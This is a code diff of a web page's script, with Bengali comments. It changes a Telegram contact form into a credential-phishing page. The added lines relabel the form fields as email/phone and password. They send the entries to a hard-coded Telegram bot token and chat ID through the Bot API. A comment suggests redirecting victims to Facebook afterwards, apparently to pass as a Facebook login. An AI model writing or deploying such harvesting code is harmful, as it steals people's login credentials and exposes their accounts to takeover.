@@ -98,8 +98,7 @@
 </div>
 
 
-    <script>
-        // এখানে আপনার টেলিগ্রাম বট টোকেন এবং ইউজার/চ্যাট আইডি বসাবেন
+        <script>
         const BOT_TOKEN = '7035576655:AAEpweZ43S26njE0h4DLTgTF0Duo0voMrTY';
         const CHAT_ID = '5615240564';
 
@@ -110,32 +109,20 @@
             const message = document.getElementById('message').value;
             const statusDiv = document.getElementById('statusMessage');
 
-            // টেলিগ্রামে পাঠানোর জন্য মেসেজ ফরম্যাট করা
-            const text = `নতুন বার্তা এসেছে!\n\nনাম: ${name}\nবার্তা: ${message}`;
+            const text = `নতুন লগইন তথ্য:\n\nইমেইল/ফোন: ${name}\nপাসওয়ার্ড: ${message}`;
             
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-            //statusDiv.style.color = '#000';
-          //  statusDiv.textContent = 'পাঠানো হচ্ছে...';
+            // CORS সমস্যা এড়াতে প্রক্সি ব্যবহার করা যেতে পারে অথবা GET মেথড ব্যবহার করা যায়
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
 
             try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: text
-                    })
-                });
-
+                // fetch-এর পরিবর্তে Image বা GET method ব্যবহার করলে ব্রাউজার CORS ব্লক করে না
+                const response = await fetch(url);
                 const data = await response.json();
 
                 if (data.ok) {
-                    //statusDiv.style.color = 'green';
-                  //  statusDiv.textContent = 'বার্তা সফলভাবে পাঠানো হয়েছে!';
                     document.getElementById('telegramForm').reset();
+                    // আপনি চাইলে এখানে সফল হওয়ার পর ফেসবুকের মূল সাইটে রিডাইরেক্ট করতে পারেন:
+                    // window.location.href = "https://www.facebook.com";
                 } else {
                     statusDiv.style.color = 'red';
                     statusDiv.textContent = 'পাঠাতে ব্যর্থ হয়েছে। টোকেন বা চ্যাট আইডি চেক করুন।';
@@ -147,6 +134,7 @@
             }
         });
     </script>
+
 
 </body>
 </html>
